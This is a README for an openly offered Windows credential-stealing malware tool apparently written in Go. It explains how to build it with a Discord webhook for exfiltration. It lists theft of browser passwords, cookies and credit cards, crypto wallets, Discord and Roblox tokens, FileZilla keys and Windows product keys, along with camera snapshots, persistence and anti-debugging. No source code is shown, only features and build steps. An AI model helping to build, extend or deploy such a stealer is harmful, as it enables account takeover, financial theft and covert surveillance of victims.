### NOTES
**THIS WILL NOT RUN ON AN AMD CPU, I also do not have an AMD cpu so I can not debug it to add support sadly, Pull requests are welcome.**

**You will need to**
- [Download Golang](https://golang.org/doc/install?download=go1.15.2.windows-amd64.msi) - golang compiler
- [Download GCC compiler](https://github.com/jmeubank/tdm-gcc/releases/download/v10.3.0-tdm64-2/tdm64-gcc-10.3.0-2.exe) (Terry a davis would hate this)

### Building the binary
- Run **installDependencies.bat**
- Change the webhook in webhook.txt
- Run **buildBinary.bat** to build the binary

# Features
- Easy to setup (I believe it is atleast?)
- Discord webhook support
- Stops them from flooding your webhook by running it multiple times
- Harder to get the webhook from dumping it in a program like IDA/Ghidra (Uses AES256 encryption ontop of base64)
- Persistent token logging from (all) discord clients, (Logs on their startup.)
- A little bit of anti debugger stuff
- Takes a snapshot of their camera

### TODO
- I never really update this (I mainly just add stuff as I go)
- Suggestions are welcome

# Supported data extraction programs

  ### Chromium (Logs CreditCards,Cookies,Passwords)
   - ✔️360chrome
   - ✔️Brave
   - ✔️Chrome
   - ✔️Chrome-Beta
   - ✔️Chromium
   - ✔️Microsoft-Edge
   - ✔️Opera
   - ✔️Opera-GX
   - ✔️QQbrowser
   - ✔️Vivaldi
   - ✔️Yandex
   
  ### Cryptocurrency software wallets
   - ✔️Armory
   - ✔️Bytecoin
   - ✔️Electrum
   - ✔️Ethereum
   - ✔️Exodus
 
  ### Discord builds
   - ✔️Discord
   - ✔️Discord-Canary
   - ✔️Discord-Dev
   - ✔️Discord-PTB

  ### FireFox (Does not log credit cards)
   - ✔️FireFox-Beta
   - ✔️FireFox-Dev
   - ✔️FireFox-Esr
   - ✔️FireFox-Nightly
   - ✔️K-Meleon
   - ✔️Waterfox
 
  ### Zilla
   - ✔️ Authentication key files
   - ✔️ Recent server list
   - ✔️ Site manager list
   
  ### Minecraft
   - To use the logged data, copy paste the `launcher_profiles.json` from the uploaded zip file into ```%appdata%\.minecraft```
  
  ### Misc
   - ✔️IP Address (and Geolocation)
   - ✔️Windows product key
  
  ### Roblox
  - ✔️The cookie .ROBLOSECURITY is [Roblox's Auth ticket](https://roblox.fandom.com/wiki/.ROBLOSECURITY) (Gets dumped into Cookies.txt if one was logged.)
  
  ### Windows Vault
  - ✔️Internet Explorer (10+, cookies are supported but do not log names.)
 

# What it looks like

### Credit-Cards

![](/assets/Credit.png)

### Cookies

![](/assets/Cookies.png)

### Discord Tokens

![](/assets/Tokens.png)

### Embed

![](/assets/Embed.png)

### History

![](/assets/History.png)

### Passwords

![](/assets/Passwords.png)
